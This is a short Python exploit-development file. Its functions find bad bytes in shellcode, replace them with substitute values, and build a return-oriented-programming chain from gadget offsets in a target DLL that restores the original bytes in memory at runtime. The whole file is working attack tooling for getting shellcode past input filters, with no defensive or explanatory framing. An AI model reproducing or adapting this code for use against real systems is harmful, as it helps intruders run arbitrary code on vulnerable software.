from struct import pack


def decodeShellcode(dllBase, badIndex, shellcode):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
    restoreRop = b""
    for i in range(len(badIndex)):
        if i == 0:
            offset = badIndex[i]
        else:
            offset = badIndex[i] - badIndex[i - 1]
        neg_offset = (-offset) & 0xFFFFFFFF
        value = 0
        for j in range(len(BADCHARS)):
            if shellcode[badIndex[i]] == BADCHARS[j]:
                value = CHARSTOADD[j]
        value = (value << 8) | 0x11110011

        restoreRop += pack("<L", (dllBase + 0x117C))  # pop ecx ; ret
        restoreRop += pack("<L", (neg_offset))
        restoreRop += pack("<L", (dllBase + 0x4A7B6))  # sub eax, ecx ; pop ebx ; ret
        restoreRop += pack("<L", (value))  # values in BH
        restoreRop += pack("<L", (dllBase + 0x468EE))  # add [eax+1], bh ; ret
    return restoreRop


def mapBadChars(sh):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    i = 0
    badIndex = []
    while i < len(sh):
        for c in BADCHARS:
            if sh[i] == c:
                badIndex.append(i)
        i = i + 1
    return badIndex


def encodeShellcode(sh):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
    encodedShell = sh
    for i in range(len(BADCHARS)):
        encodedShell = encodedShell.replace(
            pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i])
        )
    return encodedShell
